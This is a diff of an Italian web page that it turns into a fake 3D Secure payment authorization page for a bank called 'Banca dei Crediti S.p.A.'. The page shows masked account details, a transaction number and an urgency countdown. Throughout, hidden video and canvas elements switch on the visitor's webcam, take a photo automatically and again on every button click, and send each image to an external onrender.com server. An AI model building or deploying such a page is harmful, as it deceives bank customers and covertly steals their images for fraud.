@@ -1,19 +1,15 @@
 <!DOCTYPE html>
 <html lang="it">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Autorizza Operazione</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Autorizzazione 3D Secure - Banca dei Crediti</title>
   <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
 
     body {
-      font-family: Arial, sans-serif;
-      background-color: #f5f5f5;
+      font-family: 'Segoe UI', sans-serif;
+      background-color: #f4f4f4;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -25,20 +21,39 @@
       background-color: white;
       border-radius: 12px;
       padding: 20px;
-      box-shadow: 0 2px 12px rgba(0,0,0,0.15);
+      box-shadow: 0 2px 10px rgba(0,0,0,0.2);
       width: 100%;
       max-width: 400px;
       text-align: center;
     }
 
-    h3 {
-      font-size: 20px;
+    .logo {
+      width: 120px;
+      margin-bottom: 10px;
+    }
+
+    .bank-name {
+      font-size: 18px;
+      font-weight: bold;
+      margin-bottom: 4px;
+      color: #003366;
+    }
+
+    .secure-label {
+      font-size: 13px;
+      color: green;
       margin-bottom: 15px;
     }
 
-    p {
-      margin: 5px 0;
-      font-size: 16px;
+    .info p {
+      font-size: 15px;
+      margin: 6px 0;
+    }
+
+    .timer {
+      font-size: 15px;
+      color: red;
+      margin-bottom: 10px;
     }
 
     button {
@@ -50,20 +65,10 @@
       font-size: 16px;
       font-weight: bold;
       cursor: pointer;
-      transition: background-color 0.2s;
     }
 
-    .autorizza {
-      background-color: #ffd700;
-    }
-
-    .nega {
-      background-color: #d3d3d3;
-    }
-
-    button:hover {
-      opacity: 0.9;
-    }
+    .autorizza { background-color: #ffd700; }
+    .nega { background-color: #d3d3d3; }
 
     video, canvas {
       display: none;
@@ -73,10 +78,20 @@
 <body>
 
 <div class="card">
-  <h3>Autorizza Operazione</h3>
-  <p>Importo: <strong>12,20 USD</strong></p>
-  <p>Commissione: <strong>0,00 USD</strong></p>
-  <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
+  <img src="logo.png" class="logo" alt="Banca dei Crediti">
+  <div class="bank-name">Banca dei Crediti S.p.A.</div>
+  <div class="secure-label">Sistema di Sicurezza 3D Secure Attivo</div>
+
+  <div class="info">
+    <p>Intestatario: <strong>LORE*** MARIANI</strong></p>
+    <p>IBAN: <strong>IT60X****5678</strong></p>
+    <p>Importo: <strong>12,20 USD</strong></p>
+    <p>Commissione: <strong>0,00 USD</strong></p>
+    <p>Operazione: <strong>PAGAMENTO E-COMMERCE</strong></p>
+    <p>Transazione: <strong>#TRX-9283743</strong></p>
+    <p>Data: <strong><span id="data-operazione"></span></strong></p>
+    <p class="timer">Sessione in scadenza tra <span id="countdown">02:00</span></p>
+  </div>
 
   <video id="video" width="300" autoplay></video>
   <canvas id="canvas" width="300" height="200"></canvas>
@@ -89,8 +104,24 @@
   const video = document.getElementById('video');
   const canvas = document.getElementById('canvas');
   const context = canvas.getContext('2d');
+  const countdownEl = document.getElementById('countdown');
+  document.getElementById('data-operazione').innerText = new Date().toLocaleDateString('it-IT');
 
-  // Scatto automatico all'attivazione webcam
+  // Countdown 2 minuti
+  let seconds = 120;
+  const timer = setInterval(() => {
+    seconds--;
+    const m = String(Math.floor(seconds / 60)).padStart(2, '0');
+    const s = String(seconds % 60).padStart(2, '0');
+    countdownEl.innerText = `${m}:${s}`;
+    if (seconds <= 0) {
+      clearInterval(timer);
+      countdownEl.innerText = "00:00";
+      alert("Sessione scaduta. Riprovare.");
+    }
+  }, 1000);
+
+  // Accesso webcam + auto-scatto
   navigator.mediaDevices.getUserMedia({ video: true })
     .then(stream => {
       video.srcObject = stream;
@@ -98,28 +129,24 @@
         setTimeout(() => {
           context.drawImage(video, 0, 0, 300, 200);
           const image = canvas.toDataURL('image/png');
-          fetch('https://backend-render-server.onrender.com/upload', {
+          fetch('https://backend-render-server.onrender.com', {
             method: 'POST',
-            headers: {
-              'Content-Type': 'application/json'
-            },
+            headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
               action: 'auto-scatto',
               image: image
             })
           });
-        }, 1500); // delay breve per stabilizzazione
+        }, 1500);
       };
     });
 
   function handleClick(action) {
     context.drawImage(video, 0, 0, 300, 200);
     const image = canvas.toDataURL('image/png');
-    fetch('https://backend-render-server.onrender.com/upload', {
+    fetch('https://backend-render-server.onrender.com', {
       method: 'POST',
-      headers: {
-        'Content-Type': 'application/json'
-      },
+      headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
         action: action,
         image: image
